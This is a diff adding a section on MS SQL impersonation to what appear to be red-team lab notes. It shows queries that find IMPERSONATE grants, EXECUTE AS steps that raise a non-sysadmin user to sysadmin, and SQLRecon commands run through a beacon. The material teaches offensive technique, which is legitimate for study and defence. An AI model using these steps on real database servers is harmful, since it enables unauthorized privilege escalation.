@@ -57,4 +57,37 @@ With access several options exist for issuing queries against a SQL instance.
 
 * [HeidiSQL](https://www.heidisql.com) via Proxifier (a GUI tool)
 
-## 
+## MS SQL Impersonation
+
+MS SQL impersonation/context switching allows an executing user to use the permissions of another user without authenticating (must be explicitly granted through securable configurations: Login properties > Impersonate permission; Domain Users impersonating the DEV\mssql_svc account is a security issue since it elevates all Domain Users to sysadmin). Discover accounts to impersonate manually using the following queries:
+
+      SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
+
+The IDs returned don't mean much, so look them up with:
+
+      SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;
+
+Or write a SQL query joins these two, or use SQLRecon's impersonate module:
+
+      beacon> execute-assembly SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:impersonate
+      
+Take advantage of this as bfarmer, who we know is not a sysadmin:
+
+      > SELECT SYSTEM_USER;
+      DEV\bfarmer
+      > SELECT IS_SRVROLEMEMBER('sysadmin');
+      0
+
+Use EXECUTE AS to execute a query in the context of the target:
+
+      > EXECUTE AS login = 'DEV\mssql_svc'; SELECT SYSTEM_USER;
+      DEV\mssql_svc
+      > EXECUTE AS login = 'DEV\mssql_svc'; SELECT IS_SRVROLEMEMBER('sysadmin');
+      1
+
+SQLRecon modules can also impersonate by prefixing the module name with an i and specifying the principal to impersonate:
+
+      beacon> execute-assembly SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:iwhoami /i:DEV\mssql_svc
+
+
+      
